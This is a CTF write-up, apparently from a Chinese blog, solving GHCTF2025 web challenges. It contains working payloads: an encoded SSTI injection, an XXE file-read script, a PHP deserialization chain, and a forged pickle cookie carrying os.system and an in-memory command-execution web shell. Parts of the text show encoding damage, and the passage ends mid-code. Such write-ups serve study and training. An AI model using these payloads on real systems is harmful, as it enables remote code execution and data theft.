---
arturl_encode: "68747470733a2f2f626c6f:672e6373646e2e6e65742f323330325f38303437323930392f:61727469636c652f64657461696c732f313435393635343935"
layout: post
title: "GHCTF2025-Web"
date: 2025-03-09 22:04:49 +08:00
description: "æ›¿æ¢ä¸ºç©º, ä½¿ç”¨äº†bottleåº“, æŸ¥æ‰¾ä¸€äº›èµ„æ–™, å‘ç°å­˜åœ¨sstiæ¨¡æ¿æ³¨å…¥, æœ¬åœ°æ­å»ºç¯å¢ƒ, æŠŠwafå»æ‰, å¯ä»¥å‘ç°ä½¿ç”¨ã€‚å‰é¢ä¸€ç›´å¡åœ¨è¿™, æ²¡åŠæ³•æ‰§è¡Œä¸€äº›å‡½æ•°æ“ä½œå•¥çš„, å°±æ²¡ç®¡äº†, åé¢wpå‡ºæ¥ä¹‹åæ‰çŸ¥é“è¿™æ˜¯Sqliteæ³¨â¼Š , æ€ªæˆ‘è§è¯†çŸ­æµ…äº†ã€‚æœ‰ç‚¹å¥‡æ€ª, æˆ‘è‡ªå·±æœ¬åœ°è¯•äº†ä¸€ä¸‹è¿™ä¸ªcookieæ˜¯å¯ä»¥è¢«ååºåˆ—åŒ–ç„¶åæ‰§è¡Œçš„, ä½†æ˜¯é¶æœºä¸Šä¸€ç›´æ²¡æˆåŠŸ,å¯èƒ½æ²¡æœ‰æƒé™è¿˜æ˜¯å¹²å˜›ã€‚å¯ä»¥æ‰§è¡Œä»£ç , ä½†æ˜¯é¢˜ç›®æ˜¯æ²¡æœ‰å›æ˜¾çš„, æ‰€ä»¥éœ€è¦åå¼¹shell, è¿ä¸Šè‡ªå·±çš„vpsã€‚phpååºåˆ—åŒ–, çœ‹ä¼¼ä»£ç å¾ˆå¤š, å…¶å®å¤§éƒ½æ˜¯æ²¡æœ‰ç”¨çš„ã€‚"
keywords: "GHCTF2025--Web"
categories: ['æœªåˆ†ç±»']
tags: ['Writeup', 'Web', 'Ghctf', 'Ctf']
artid: "145965495"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=145965495
    alt: "GHCTF2025-Web"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=145965495
featuredImagePreview: https://bing.ee123.net/img/rand?artid=145965495
cover: https://bing.ee123.net/img/rand?artid=145965495
image: https://bing.ee123.net/img/rand?artid=145965495
img: https://bing.ee123.net/img/rand?artid=145965495
---

# GHCTF2025--Web

### upload?SSTI!

```php
import os
import re

from flask import Flask, request, jsonify,render_template_string,send_from_directory, abort,redirect
from werkzeug.utils import secure_filename
import os
from werkzeug.utils import secure_filename

app = Flask(__name__)

# é…ç½®ä¿¡æ¯
UPLOAD_FOLDER = 'static/uploads'  # ä¸Šä¼ æ–‡ä»¶ä¿å­˜ç›®å½•
ALLOWED_EXTENSIONS = {'txt', 'log', 'text','md','jpg','png','gif'}
MAX_CONTENT_LENGTH = 16 * 1024 * 1024  # é™åˆ¶ä¸Šä¼ å¤§å°ä¸º 16MB

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = MAX_CONTENT_LENGTH

# åˆ›å»ºä¸Šä¼ ç›®å½•ï¼ˆå¦‚æœä¸å­˜åœ¨ï¼‰
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
def is_safe_path(basedir, path):
    return os.path.commonpath([basedir,path])


def contains_dangerous_keywords(file_path):
    dangerous_keywords = ['_', 'os', 'subclasses', '__builtins__', '__globals__','flag',]

    with open(file_path, 'rb') as f:
        file_content = str(f.read())


        for keyword in dangerous_keywords:
            if keyword in file_content:
                return True  # æ‰¾åˆ°å±é™©å…³é”®å­—ï¼Œè¿”å› True

    return False  # æ–‡ä»¶å†…å®¹ä¸­æ²¡æœ‰å±é™©å…³é”®å­—
def allowed_file(filename):
    return '.' in filename and \
        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        # æ£€æŸ¥æ˜¯å¦æœ‰æ–‡ä»¶è¢«ä¸Šä¼ 
        if 'file' not in request.files:
            return jsonify({"error": "æœªä¸Šä¼ æ–‡ä»¶"}), 400

        file = request.files['file']

        # æ£€æŸ¥æ˜¯å¦é€‰æ‹©äº†æ–‡ä»¶
        if file.filename == '':
            return jsonify({"error": "è¯·é€‰æ‹©æ–‡ä»¶"}), 400

        # éªŒè¯æ–‡ä»¶åå’Œæ‰©å±•å
        if file and allowed_file(file.filename):
            # å®‰å…¨å¤„ç†æ–‡ä»¶å
            filename = secure_filename(file.filename)
            # ä¿å­˜æ–‡ä»¶
            save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            file.save(save_path)



            # è¿”å›æ–‡ä»¶è·¯å¾„ï¼ˆç»å¯¹è·¯å¾„ï¼‰
            return jsonify({
                "message": "File uploaded successfully",
                "path": os.path.abspath(save_path)
            }), 200
        else:
            return jsonify({"error": "æ–‡ä»¶ç±»å‹é”™è¯¯"}), 400

    # GET è¯·æ±‚æ˜¾ç¤ºä¸Šä¼ è¡¨å•ï¼ˆå¯é€‰ï¼‰
    return '''
    <!doctype html>
    <title>Upload File</title>
    <h1>Upload File</h1>
    <form method=post enctype=multipart/form-data>
      <input type=file name=file>
      <input type=submit value=Upload>
    </form>
    '''

@app.route('/file/<path:filename>')
def view_file(filename):
    try:
        # 1. è¿‡æ»¤æ–‡ä»¶å
        safe_filename = secure_filename(filename)
        if not safe_filename:
            abort(400, description="æ— æ•ˆæ–‡ä»¶å")

        # 2. æ„é€ å®Œæ•´è·¯å¾„
        file_path = os.path.join(app.config['UPLOAD_FOLDER'], safe_filename)

        # 3. è·¯å¾„å®‰å…¨æ£€æŸ¥
        if not is_safe_path(app.config['UPLOAD_FOLDER'], file_path):
            abort(403, description="ç¦æ­¢è®¿é—®çš„è·¯å¾„")

        # 4. æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨
        if not os.path.isfile(file_path):
            abort(404, description="æ–‡ä»¶ä¸å­˜åœ¨")

        suffix=os.path.splitext(filename)[1]
        print(suffix)
        if suffix==".jpg" or suffix==".png" or suffix==".gif":
            return send_from_directory("static/uploads/",filename,mimetype='image/jpeg')

        if contains_dangerous_keywords(file_path):
            # åˆ é™¤ä¸å®‰å…¨çš„æ–‡ä»¶
            os.remove(file_path)
            return jsonify({"error": "Waf!!!!"}), 400

        with open(file_path, 'rb') as f:
            file_data = f.read().decode('utf-8')
        tmp_str = """<!DOCTYPE html>
        <html lang="zh">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>æŸ¥çœ‹æ–‡ä»¶å†…å®¹</title>
        </head>
        <body>
            <h1>æ–‡ä»¶å†…å®¹ï¼š{name}</h1>  <!-- æ˜¾ç¤ºæ–‡ä»¶å -->
            <pre>{data}</pre>  <!-- æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ -->

            <footer>
                <p>&copy; 2025 æ–‡ä»¶æŸ¥çœ‹å™¨</p>
            </footer>
        </body>
        </html>
        """.format(name=safe_filename, data=file_data)

        return render_template_string(tmp_str)

    except Exception as e:
        app.logger.error(f"æ–‡ä»¶æŸ¥çœ‹å¤±è´¥: {str(e)}")
        abort(500, description="æ–‡ä»¶æŸ¥çœ‹å¤±è´¥:{} ".format(str(e)))


# é”™è¯¯å¤„ç†ï¼ˆå¯é€‰ï¼‰
@app.errorhandler(404)
def not_found(error):
    return {"error": error.description}, 404


@app.errorhandler(403)
def forbidden(error):
    return {"error": error.description}, 403


if __name__ == '__main__':
    app.run("0.0.0.0",debug=False)


```

å¾ˆæ˜æ˜¾çš„ssti, è¿‡æ»¤çš„å†…å®¹ä¹Ÿä¸å¤š
  
ç›´æ¥ç¼–ç ç»•å°±è¡Œ
  
payload:

```
{{lipsum|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u0067\u0065\u0074")("\u006f\u0073")|attr("\u0070\u006f\u0070\u0065\u006e")("cat /f*")|attr("\u0072\u0065\u0061\u0064")()}}

```

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/4f18763b5930498b82e552522990090d.png)
  
ç›´æ¥è®¿é—®
`/file/1.txt`
å°±è¡Œ
  
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/d3435e906d434d56968fb966dae275b0.png)

### (>ï¹<)

ç›´æ¥ç»™äº†æºç 

```python
from flask import Flask, request
import base64
from lxml import etree
import re

app = Flask(__name__)


@app.route('/')
def index():
    return open(__file__).read()


@app.route('/ghctf', methods=['POST'])
def parse():
    xml = request.form.get('xml')
    print(xml)
    if xml is None:
        return "No System is Safe."
    parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
    root = etree.fromstring(xml, parser)
    name = root.find('name').text
    return name or None


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)


```

`parser = etree.XMLParser(load_dtd=True, resolve_entities=True)`
  
load\_dtd=True: å…è®¸è§£æå™¨åŠ è½½å¹¶å¤„ç† XML æ–‡æ¡£ä¸­çš„ DTD
  
resolve\_entities=True: å¯ç”¨å®ä½“è§£æåŠŸèƒ½ï¼ŒåŒ…æ‹¬å¤–éƒ¨å®ä½“

å¾ˆæ˜æ˜¾çš„æ‰“xxe, è€Œä¸”ä¹Ÿæ²¡æœ‰ä»€ä¹ˆè¿‡æ»¤

```python
import requests

url="http://node2.anna.nssctf.cn:28836/ghctf"
payload="""<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///flag">
]>
<root>
    <name>&xxe;</name>
</root>"""

data={"xml":payload}
res = requests.post(url=url, data=data)
print(res.text)

```

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/c35c1eb496cd4757b8f67fd59a0fb556.png)

### ez\_readfile

ä»£ç å¾ˆç®€å•

```php
<?php
  show_source(__FILE__);
  if (md5($_POST['a']) === md5($_POST['b'])) {
      if ($_POST['a'] != $_POST['b']) {
          if (is_string($_POST['a']) && is_string($_POST['b'])) {
              echo file_get_contents($_GET['file']);
          }
      }
  }
?>

```

åŸºç¡€çš„md5ç»•è¿‡, ç„¶åå°±æ˜¯
`file_get_contents`
è¯»æ–‡ä»¶
  
ä½†æ˜¯è¯»äº†
`/flag`
æ²¡æœ‰ååº”, åº”è¯¥æ˜¯æ”¹äº†æ–‡ä»¶å
  
é¦–å…ˆå¼€å§‹æƒ³çš„æ˜¯PHP Base64 Filterå®½æ¾è§£æç‰¹æ€§å’Œiconv filterç¼–ç è½¬æ¢æ„é€ å‘½ä»¤æ‰§è¡Œ
  
ä½†æ˜¯å¥½åƒæ²¡æœ‰ç”¨, æ ¹æœ¬æ²¡åŠæ³•å»æ‰§è¡Œ
  
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/035bbcf180b34a17b07c864a607b7a57.png)
  
ç„¶åæƒ³çš„æ˜¯åˆ©ç”¨
`CVE-2024-2961`
ä»è¯»æ–‡ä»¶åˆ°rce, ä½†ä¹Ÿæ˜¯ä¸€ç›´æ²¡æˆåŠŸ, æœ‰ç‚¹ä¸ç†è§£

åé¢å°±æƒ³è¯»ä¸€ä¸‹ç¯å¢ƒå˜é‡,
`/proc/self/environ`
, ä½†æ˜¯æƒé™ä¸è¶³
  
å°±ä¸€ç›´æƒ³æ‰¾æœ‰æ²¡æœ‰ä»€ä¹ˆæ–‡ä»¶èƒ½æŒ‡å®šflagæ–‡ä»¶çš„åå­—
  
åé¢å°±æ‰¾åˆ°äº†
`/docker-entrypoint.sh`
è¿™ä¸ªæ–‡ä»¶
  
å‘ç°é‡Œé¢æœ‰flagçš„æ–‡ä»¶å (çœŸæ˜¯ç¦»è°±çš„é•¿)
  
ç›´æ¥è¯»å®ƒæ‹¿åˆ°flag
  
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/ce9c45c5af0249238811307f503a2dd0.png)

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/d037a199b0604564a4545353c8de8dde.png)

### Popppppp

phpååºåˆ—åŒ–, çœ‹ä¼¼ä»£ç å¾ˆå¤š, å…¶å®å¤§éƒ½æ˜¯æ²¡æœ‰ç”¨çš„
  
ä¸€äº›åˆ†æçš„è¿‡ç¨‹å†™åœ¨æ³¨é‡Šé‡Œé¢äº†

```php
<?php
error_reporting(0);

class CherryBlossom {
    public $fruit1;
    public $fruit2;

    public function __construct($a) {
        $this->fruit1 = $a;
    }

    function __destruct() {
        echo $this->fruit1; //æ‰¾toString,æœ‰ä¸‰ä¸ªç±»å­˜åœ¨è¿™ä¸ªæ–¹æ³• CherryBlossom, UselessTwo, Samurai
                            //1.1 $fruit1=new CherryBlossom    
    }

    public function __toString() {
        $newFunc = $this->fruit2;
        return $newFunc(); //æ‰¾__invoke, 1.2 $fruit2= new Philosopher
    }
}

class Forbidden {
    private $fruit3;

    public function __construct($string) {
        $this->fruit3 = $string;
    }

    public function __get($name) {
        $var = $this->$name;
        $var[$name]();
    }
}

class Warlord {
    public $fruit4;
    public $fruit5;
    public $arg1;

    public function __call($arg1, $arg2) {
        $function = $this->fruit4;
        return $function();
    }

    public function __get($arg1) {
        $this->fruit5->ll2('b2');
    }
}

class Samurai {
    public $fruit6;
    public $fruit7;

    public function __toString() {
        $long = @$this->fruit6->add();
        return $long;
    }

    public function __set($arg1, $arg2) {
        if ($this->fruit7->tt2) {
            echo "xxx are the best!!!";
        }
    }
}

class Mystery {
    //è‡ªå·±æ‰‹åŠ¨åŠ 
    public $SplFileObject = "php://filter/read=convert.base64-encode/resource=/flag";
	//$day2å¯¹è±¡çš„å±æ€§å, $day1æ˜¯å¯¹è±¡çš„å±æ€§å€¼
    public function __get($arg1) {
        array_walk($this, function ($day1, $day2) {
            $day3 = new $day2($day1); //åˆ©ç”¨SplFileObjectè¯»å–æ–‡ä»¶
            foreach ($day3 as $day4) {
                echo ($day4 . '<br>');
            }
        });
    }
}

class Princess {
    protected $fruit9;

    protected function addMe() {
        return "The time spent with xxx is my happiest time" . $this->fruit9;
    }

    public function __call($func, $args) {
        call_user_func([$this, $func . "Me"], $args);
    }
}

class Philosopher {
    public $fruit10;
    public $fruit11="sr22kaDugamdwTPhG5zU";

    public function __invoke() {
        if (md5(md5($this->fruit11)) == 666) {//éœ€è¦ç»•è¿‡, å¼±æ¯”è¾ƒ, æ‰€ä»¥éœ€è¦æ‰¾åˆ°md5å€¼å¼€å¤´æ˜¯666åæ¥å­—æ¯çš„è¡¨è¾¾, å†™ä¸€ä¸ªè„šæœ¬è·‘ä¸€ä¸‹å¯ä»¥æ‰¾åˆ°å¾ˆå¤š æ¯”å¦‚"7000120353"
            return $this->fruit10->hey; //heyæ˜¯ä¸å­˜åœ¨çš„å±æ€§,æ‰¾__get æœ‰ä¸‰ä¸ªç±»é‡Œé¢æœ‰è¿™ä¸ªæ–¹æ³•, Mystery, Warlord, Forbidden
        }                               //ä½¿ç”¨Mystery  1.3 $fruit10=new Mystery
    }                                   
}

class UselessTwo {
    public $hiddenVar = "123123";

    public function __construct($value) {
        $this->hiddenVar = $value;
    }

    public function __toString() {
        return $this->hiddenVar;
    }
}

class Warrior {
    public $fruit12;
    private $fruit13;

    public function __set($name, $value) {
        $this->$name = $value;
        if ($this->fruit13 == "xxx") {
            strtolower($this->fruit12);
        }
    }
}

class UselessThree {
    public $dummyVar;

    public function __call($name, $args) {
        return $name;
    }
}


class UselessFour {
     public $lalala;

     public function __destruct() {
         echo "Hehe";
     }
 }

if (isset($_GET['GHCTF'])) {
    unserialize($_GET['GHCTF']);
} else {
    highlight_file(__FILE__);
}



//åˆ©ç”¨ç‚¹: 1.Mysteryé‡Œé¢çš„array_walkå‡½æ•°
//2. Princessç±»é‡Œé¢çš„call_user_funcå‡½æ•°


$a=new CherryBlossom();
$a->fruit1=new CherryBlossom();
$a->fruit1->fruit2= new Philosopher();
$a->fruit1->fruit2->fruit11=7000120353;
$a->fruit1->fruit2->fruit10=new Mystery();

echo serialize($a);

```

æœ€åå°±æ˜¯è¦åˆ©ç”¨phpçš„åŸç”Ÿç±»è¿›è¡Œè¯»å–ç›®å½•ä»¥åŠè¯»å–æ–‡ä»¶
  
`GlobIterator`
é…åˆ
`glob://`
åè®®è¯»å–æ ¹ç›®å½•
  
`SplFileObject`
é…åˆphpä¼ªåè®®è¯»å–æ–‡ä»¶

```php
<?php
error_reporting(0);

class CherryBlossom {
    public $fruit1;
    public $fruit2;

    function __destruct() {
        echo $this->fruit1; //æ‰¾toString,æœ‰ä¸‰ä¸ªç±»å­˜åœ¨è¿™ä¸ªæ–¹æ³• CherryBlossom, UselessTwo, Samurai
        //1.1 $fruit1=new CherryBlossom
    }

    public function __toString() {
        $newFunc = $this->fruit2;
        return $newFunc(); //æ‰¾invoke, 1.2 $fruit2= new Philosopher
    }
}

class Mystery {
    //è‡ªå·±æ‰‹åŠ¨åŠ 
//    public $SplFileObject = "php://filter/read=convert.base64-encode/resource=flag.php";
    public $GlobIterator="glob:///*";
    public function __get($arg1) {
        array_walk($this, function ($day1, $day2) {
            $day3 = new $day2($day1); //åˆ©ç”¨SplFileObjectè¯»å–æ–‡ä»¶
            foreach ($day3 as $day4) {
                echo ($day4 . '<br>');
            }
        });
    }
}


class Philosopher {
    public $fruit10;
    public $fruit11="sr22kaDugamdwTPhG5zU";

    public function __invoke() {
        if (md5(md5($this->fruit11)) == 666) {//éœ€è¦ç»•è¿‡, è‹¥æ¯”è¾ƒ, æ‰€ä»¥éœ€è¦æ‰¾åˆ°md5å€¼å¼€å¤´æ˜¯666åæ¥å­—æ¯çš„è¡¨è¾¾ "7000120353"
            return $this->fruit10->hey; //heyæ˜¯ä¸å­˜åœ¨çš„å±æ€§,æ‰¾__get æœ‰ä¸‰ä¸ªç±»é‡Œé¢æœ‰è¿™ä¸ªæ–¹æ³•, Mystery, Warlord, Forbidden
        }                               //ä½¿ç”¨Mystery  1.3 $fruit10=new Mystery
    }
}

//åˆ©ç”¨ç‚¹: Mysteryé‡Œé¢çš„array_walkå‡½æ•°


$a=new CherryBlossom();
$a->fruit1=new CherryBlossom();
$a->fruit1->fruit2= new Philosopher();
$a->fruit1->fruit2->fruit11=7000120353;
$a->fruit1->fruit2->fruit10=new Mystery();

echo urlencode(serialize($a));

```

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/40a977bbf08b4cd3bd90fc6ae8c8bd4c.png)
  
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/09aacd0c8e354cd2b949dea2c6a59041.png)

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/87a7e0baa0974adf8dcb0f5ae0b72e1c.png)

md5çˆ†ç ´çš„è„šæœ¬

```python
# @Author   ï¼šwi1shu


import hashlib
import threading

total = 100000000000  # ä»1åˆ°å¤šå°‘
threads = 100  # çº¿ç¨‹æ•°
truncation = "666"  # è¢«æˆªæ–­çš„å€¼
positions = [0, 3]  # æˆªæ–­ä½ç½®
per_thread = total // threads
threads_list = []

def double_md5(value):
    first_hash = hashlib.md5(str(value).encode()).hexdigest()
    second_hash = hashlib.md5(first_hash.encode()).hexdigest()
    return second_hash

def calculate_md5(start, end):
    for i in range(start, end):
        md5 = double_md5(i)
        if md5[positions[0]:positions[1]] == truncation:
            print(f"{truncation} -> {i}: {md5}")

if __name__ == "__main__":
    for i in range(threads):
        start = i * per_thread + 1
        end = start + per_thread
        if i == threads - 1:
            end = total + 1
        thread = threading.Thread(target=calculate_md5, args=(start, end))
        threads_list.append(thread)
        thread.start()
    
    for thread in threads_list:
        thread.join()
    
    print("finished.")

```

### ezzzz\_pickle

ä¸€ä¸ªç™»å½•æ¡†, admin / admin123 å¼±å£ä»¤è¿›å…¥
  
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/5694c3049dfd45779913f93ee6d5ab39.png)

ç‚¹å‡»è¯»å–flag, æŠ“åŒ…, å¯ä»¥çœ‹åˆ°ä¸€ä¸ª
`filename`
å‚æ•°

![ ](https://i-blog.csdnimg.cn/direct/5e75c931a68d45cd9ece781abcc6ea48.png)

å¯ä»¥è¯»å–æ–‡ä»¶
  
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/6be7573e9d7446728585bdc377f671a2.png)

æ„Ÿè§‰è¿™ä¸ªè¯»å–æ–‡ä»¶çš„å…¨éƒ½å¯ä»¥ç”¨å‰é¢å‘ç°çš„éé¢„æœŸäº†
  
è¯»å–è¿™ä¸ªæ–‡ä»¶
`docker-entrypoint.sh`

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/b2c27279c0534cdaa8644096b174b799.png)

![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/54aef9178a664b9f95fa5598953c4246.png)

ä¸è¿‡è¿˜æ˜¯è¦å°è¯•é¢„æœŸåšæ³•, è¯»ä¸€ä¸‹æºç 

```python
from flask import Flask, request, redirect, make_response, render_template
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import pickle
import base64
import time
import os

app = Flask(__name__)

def generate_key_iv():
    key = os.environ.get('SECRET_key').encode()
    iv = os.environ.get('SECRET_iv').encode()
    return key, iv

def aes_encrypt_decrypt(data, key, iv, mode='encrypt'):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    
    if mode == 'encrypt':
        encryptor = cipher.encryptor()
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(data.encode()) + padder.finalize()
        result = encryptor.update(padded_data) + encryptor.finalize()
        return base64.b64encode(result).decode()
    
    elif mode == 'decrypt':
        decryptor = cipher.decryptor()
        encrypted_data_bytes = base64.b64decode(data)
        decrypted_data = decryptor.update(encrypted_data_bytes) + decryptor.finalize()
        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
        return unpadded_data.decode()

users = {"admin": "admin123"}

def create_session(username):
    session_data = {"username": username, "expires": time.time() + 3600}
    pickled = pickle.dumps(session_data)
    pickled_data = base64.b64encode(pickled).decode('utf-8')
    key, iv = generate_key_iv()
    session = aes_encrypt_decrypt(pickled_data, key, iv, mode='encrypt')
    return session

def download_file(filename):
    path = os.path.join("static", filename)
    with open(path, 'rb') as f:
        data = f.read().decode('utf-8')
    return data

def validate_session(cookie):
    try:
        key, iv = generate_key_iv()
        pickled = aes_encrypt_decrypt(cookie, key, iv, mode='decrypt')
        pickled_data = base64.b64decode(pickled)
        session_data = pickle.loads(pickled_data)
        
        if session_data["username"] != "admin":
            return False
        
        return session_data if session_data["expires"] > time.time() else False
    except:
        return False

@app.route("/", methods=['GET', 'POST'])
def index():
    if "session" in request.cookies:
        session = validate_session(request.cookies["session"])
        if session:
            data = ""
            filename = request.form.get("filename")
            if filename:
                data = download_file(filename)
            return render_template("index.html", name=session['username'], file_data=data)
    return redirect("/login")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        if users.get(username) == password:
            resp = make_response(redirect("/"))
            resp.set_cookie("session", create_session(username))
            return resp
        return render_template("login.html", error="Invalid username or password")
    return render_template("login.html")

@app.route("/logout")
def logout():
    resp = make_response(redirect("/login"))
    resp.delete_cookie("session")
    return resp

if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=False)


```

å¯ä»¥æ‹¿åˆ°æºç , å¯ä»¥å‘ç°åœ¨æ ¡éªŒcookieçš„æ—¶å€™ä¼šæ‰§è¡Œ
`pickle.loads`
, è¿›è¡Œååºåˆ—åŒ–, å°±æ˜¯è¦åˆ©ç”¨è¿™é‡Œ, æ‰€ä»¥éœ€è¦ä¼ªé€ cookie

```python
def validate_session(cookie):
    try:
        key, iv = generate_key_iv()
        pickled = aes_encrypt_decrypt(cookie, key, iv, mode='decrypt')
        pickled_data = base64.b64decode(pickled)
        session_data =a pickle.loads(pickled_dta) #æ¼æ´ç‚¹, è¿›è¡Œååºåˆ—åŒ–
        
        if session_data["username"] != "admin":
            return False
        
        return session_data if session_data["expires"] > time.time() else False
    except:
        return False

```

ç»§ç»­è¯»ç¯å¢ƒå˜é‡, å¯ä»¥å‘ç°
`SECRET_key`
,
`SECRET_iv`
çš„å€¼
  
`key=ajwdopldwjdowpajdmslkmwjrfhgnbbv`
  
`iv=asdwdggiouewhgpw`
  
![åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°](https://i-blog.csdnimg.cn/direct/981ee1a59e864d6eb4fd523a33ac8a7a.png)
æœ‰äº†key, é‚£å°±å¯ä»¥ä¼ªé€ cookieäº†, å½“æœåŠ¡å™¨æ ¡éªŒcookieçš„æ—¶å€™å°±å¯ä»¥è§¦å‘
`pickle.loads`
è¿›è¡Œååºåˆ—åŒ–, æ‰§è¡Œæ¶æ„ä»£ç äº†
  
ä¸è¿‡æ²¡æœ‰å›æ˜¾, å¯ä»¥å°è¯•å†™æ–‡ä»¶, åå¼¹shell, æ‰“å†…å­˜é©¬ä¹‹ç±»çš„

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import pickle
import base64
import time
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami > /tmp/1.txt',))


def generate_key_iv():
    key = b"ajwdopldwjdowpajdmslkmwjrfhgnbbv"
    iv = b"asdwdggiouewhgpw"
    return key, iv


def aes_encrypt_decrypt(data, key, iv, mode='encrypt'):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())

    if mode == 'encrypt':
        encryptor = cipher.encryptor()
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(data.encode()) + padder.finalize()
        result = encryptor.update(padded_data) + encryptor.finalize()
        return base64.b64encode(result).decode()

    elif mode == 'decrypt':
        decryptor = cipher.decryptor()
        encrypted_data_bytes = base64.b64decode(data)
        decrypted_data = decryptor.update(encrypted_data_bytes) + decryptor.finalize()
        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
        return unpadded_data.decode()


users = {"admin": "admin123"}

def create_session(username):
    session_data = {"username": username, "expires": time.time() + 3600, "exp":Exploit()} #åŠ ä¸Šæ¶æ„ä»£ç 
    pickled = pickle.dumps(session_data)
    pickled_data = base64.b64encode(pickled).decode('utf-8')
    print(pickled_data)
    key, iv = generate_key_iv()
    session = aes_encrypt_decrypt(pickled_data, key, iv, mode='encrypt')
    print("[+]session:"+session)
    return session


def validate_session(cookie):
    try:
        key, iv = generate_key_iv()
        pickled = aes_encrypt_decrypt(cookie, key, iv, mode='decrypt')
        # print(pickled)
        pickled_data = base64.b64decode(pickled)
        # print(pickled_data)
        session_data = pickle.loads(pickled_data)
        print(session_data)

        if session_data["username"] != "admin":
            return False

        return session_data if session_data["expires"] > time.time() else False
    except:
        return False


create_session("admin")
# 3AIoDTviFKHyONegqv4u+FWzecUPuH3EsKRB1Vioy9BWo7scZqKebzY5GfXDjcWUxxwwZWo1QRVo3tmcAosqCnRWQUtPARbxkZsiGhTQSA4iu28IAZp/5LKFcdfVXji+IOTuvlcc2mjPionMqgOZ3aomjGveIS0rbYoe9nok6yTzitoe3B4tf23ltbIGKWGE

```

æœ‰ç‚¹å¥‡æ€ª, æˆ‘è‡ªå·±æœ¬åœ°è¯•äº†ä¸€ä¸‹è¿™ä¸ªcookieæ˜¯å¯ä»¥è¢«ååºåˆ—åŒ–ç„¶åæ‰§è¡Œçš„, ä½†æ˜¯é¶æœºä¸Šä¸€ç›´æ²¡æˆåŠŸ,å¯èƒ½æ²¡æœ‰æƒé™è¿˜æ˜¯å¹²å˜›
  
ç„¶ååˆè¯•è¯•æ‰“å†…å­˜é©¬

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import pickle
import base64
import time
import os

class Exp:
    def __reduce__(self):
        return (exec,("global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()",))


def generate_key_iv():
    key = b"ajwdopldwjdowpajdmslkmwjrfhgnbbv"
    iv = b"asdwdggiouewhgpw"
    return key, iv


def aes_encrypt_decrypt(data, key, iv, mode='encrypt'):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())

    if mode == 'encrypt':
        encryptor = cipher.encryptor()
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(data.encode()) + padder.finalize()
        result = encryptor.update(padded_data) + encryptor.finalize()
        return base64.b64encode(result).decode()

    elif mode == 'decrypt':
        decryptor = cipher.decryptor()
        encrypted_data_bytes = base64.b64decode(data)
        decrypted_data = decryptor.update(encrypted_data_bytes) + decryptor.finalize()
        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
        return unpadded_data.decode()


users = {"admin": "admin123"}

def create_session(username):
